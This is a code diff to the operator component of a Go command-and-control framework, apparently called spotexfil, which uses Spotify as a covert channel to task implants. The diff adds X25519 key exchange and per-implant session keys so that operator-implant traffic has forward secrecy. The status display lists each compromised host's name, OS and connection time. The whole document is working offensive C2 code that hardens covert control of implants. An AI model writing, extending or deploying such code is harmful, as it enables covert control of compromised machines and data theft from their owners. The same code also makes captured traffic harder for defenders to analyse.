@@ -3,6 +3,8 @@ package c2
 import (
 	"bufio"
 	"context"
+	"crypto/ecdh"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"os"
@@ -12,6 +14,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/sourcefrenchy/spotexfil/internal/crypto"
 	"github.com/sourcefrenchy/spotexfil/internal/protocol"
 	"github.com/sourcefrenchy/spotexfil/internal/shared"
 	"github.com/sourcefrenchy/spotexfil/internal/spotify"
@@ -38,6 +41,11 @@ type Operator struct {
 	lastPoll         time.Time             // timestamp of last successful poll
 	pollInterval     time.Duration         // background poll interval
 	attachedClient   string                // currently attached client_id ("" = none)
+
+	// Forward secrecy via X25519
+	ephPriv     *ecdh.PrivateKey
+	ephPub      *ecdh.PublicKey
+	sessionKeys map[string][]byte // client_id -> session key
 }
 
 // NewOperator creates a new operator.
@@ -45,6 +53,20 @@ func NewOperator(client *spotify.Client, key string, pollIntervalSec int) *Opera
 	if pollIntervalSec < 15 {
 		pollIntervalSec = 15
 	}
+
+	// Generate X25519 ephemeral key pair for forward secrecy
+	ephPriv, err := crypto.GenerateX25519()
+	if err != nil {
+		fmt.Printf("[!] Failed to generate X25519 keypair: %v\n", err)
+		fmt.Println("[!] Forward secrecy will not be available")
+	}
+
+	var ephPub *ecdh.PublicKey
+	if ephPriv != nil {
+		ephPub = ephPriv.PublicKey()
+		fmt.Printf("[*] X25519 pubkey: %s\n", hex.EncodeToString(ephPub.Bytes()))
+	}
+
 	return &Operator{
 		client:           client,
 		key:              key,
@@ -52,6 +74,9 @@ func NewOperator(client *spotify.Client, key string, pollIntervalSec int) *Opera
 		pendingSeqs:      make(map[int]string),
 		connectedClients: make(map[string]ClientInfo),
 		pollInterval:     time.Duration(pollIntervalSec) * time.Second,
+		ephPriv:          ephPriv,
+		ephPub:           ephPub,
+		sessionKeys:      make(map[string][]byte),
 	}
 }
 
@@ -71,7 +96,25 @@ func (op *Operator) SendCommand(module string, args map[string]interface{}) (int
 		}
 	}
 
-	encoded, err := protocol.EncodeMessage(msg.ToCommandMap(), op.key)
+	// Use session key if forward secrecy is established for this client
+	var encoded string
+	var err error
+	if op.attachedClient != "" {
+		if sk, ok := op.sessionKeys[op.attachedClient]; ok {
+			// Add pubkey to keyexchange commands
+			if module == "keyexchange" && op.ephPub != nil {
+				msg.PubKey = hex.EncodeToString(op.ephPub.Bytes())
+			}
+			encoded, err = protocol.EncodeMessageRaw(msg.ToCommandMap(), sk)
+		}
+	}
+	if encoded == "" {
+		// Add pubkey to keyexchange commands (fallback path)
+		if module == "keyexchange" && op.ephPub != nil {
+			msg.PubKey = hex.EncodeToString(op.ephPub.Bytes())
+		}
+		encoded, err = protocol.EncodeMessage(msg.ToCommandMap(), op.key)
+	}
 	if err != nil {
 		return 0, fmt.Errorf("encode: %w", err)
 	}
@@ -103,9 +146,21 @@ func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
 	results := make(map[int]map[string]interface{})
 	for seqNum, chunkMetas := range seqGroups {
 		payload := protocol.ReassemblePayload(chunkMetas)
-		result, err := protocol.DecodeMessage(payload, op.key)
-		if err != nil {
-			// Stale or corrupted result — discard silently
+
+		// Try session keys first (forward secrecy), fall back to master key
+		var result map[string]interface{}
+		var decErr error
+		for _, sk := range op.sessionKeys {
+			result, decErr = protocol.DecodeMessageRaw(payload, sk)
+			if decErr == nil {
+				break
+			}
+		}
+		if result == nil {
+			result, decErr = protocol.DecodeMessage(payload, op.key)
+		}
+		if decErr != nil {
+			// Stale or corrupted result -- discard silently
 			continue
 		}
 		// Handle checkin beacon
@@ -152,7 +207,7 @@ func (op *Operator) checkForCheckins() bool {
 	if err != nil {
 		wait := handleAPIError(err, "poll")
 		if wait > 600 {
-			// Hard block — slow down the poller dramatically
+			// Hard block -- slow down the poller dramatically
 			op.pollBackoff = time.Duration(wait) * time.Second
 		} else if wait > 0 {
 			op.pollBackoff = time.Duration(wait) * time.Second
@@ -614,8 +669,12 @@ func (op *Operator) printStatus() {
 	if len(op.connectedClients) > 0 {
 		fmt.Printf("[*] Connected implants (%d):\n", len(op.connectedClients))
 		for cid, info := range op.connectedClients {
-			fmt.Printf("  %s  %s  %s  since %s\n",
-				cid, info.Hostname, info.OS, info.ConnectedAt)
+			fs := "no"
+			if _, ok := op.sessionKeys[cid]; ok {
+				fs = "yes"
+			}
+			fmt.Printf("  %s  %s  %s  since %s  fs=%s\n",
+				cid, info.Hostname, info.OS, info.ConnectedAt, fs)
 		}
 	} else {
 		fmt.Println("[*] No implants connected")
@@ -684,6 +743,56 @@ func (op *Operator) handleCheckin(result map[string]interface{}) {
 		"    timestamp : %s\n\n%s",
 		clientID, sessionID[:12], hostname, osInfo, user, timestamp,
 		op.prompt())
+
+	// Negotiate forward secrecy if implant sent a pubkey
+	if peerPubHex, ok := info["pubkey"].(string); ok && peerPubHex != "" {
+		op.negotiateForwardSecrecy(clientID, peerPubHex)
+	}
+}
+
+// negotiateForwardSecrecy computes the shared secret and sends a keyexchange
+// command to the implant.
+func (op *Operator) negotiateForwardSecrecy(clientID, peerPubHex string) {
+	if op.ephPriv == nil {
+		return
+	}
+
+	peerPubBytes, err := hex.DecodeString(peerPubHex)
+	if err != nil {
+		fmt.Printf("[!] Forward secrecy failed for %s: invalid pubkey hex\n", clientID[:8])
+		return
+	}
+
+	peerPub, err := ecdh.X25519().NewPublicKey(peerPubBytes)
+	if err != nil {
+		fmt.Printf("[!] Forward secrecy failed for %s: invalid X25519 pubkey\n", clientID[:8])
+		return
+	}
+
+	sharedSecret, err := op.ephPriv.ECDH(peerPub)
+	if err != nil {
+		fmt.Printf("[!] Forward secrecy failed for %s: ECDH error\n", clientID[:8])
+		return
+	}
+
+	sessionKey, err := crypto.DeriveSessionKey(sharedSecret, op.key)
+	if err != nil {
+		fmt.Printf("[!] Forward secrecy failed for %s: key derivation error\n", clientID[:8])
+		return
+	}
+
+	op.sessionKeys[clientID] = sessionKey
+
+	// Send keyexchange command with our pubkey so implant can derive the same key.
+	// Temporarily attach to this client to send the command.
+	prevAttached := op.attachedClient
+	op.attachedClient = clientID
+	op.SendCommand("keyexchange", map[string]interface{}{
+		"pubkey": hex.EncodeToString(op.ephPub.Bytes()),
+	})
+	op.attachedClient = prevAttached
+
+	fmt.Printf("[*] Forward secrecy established with %s\n", clientID[:8])
 }
 
 func displayResult(seq int, result map[string]interface{}) {
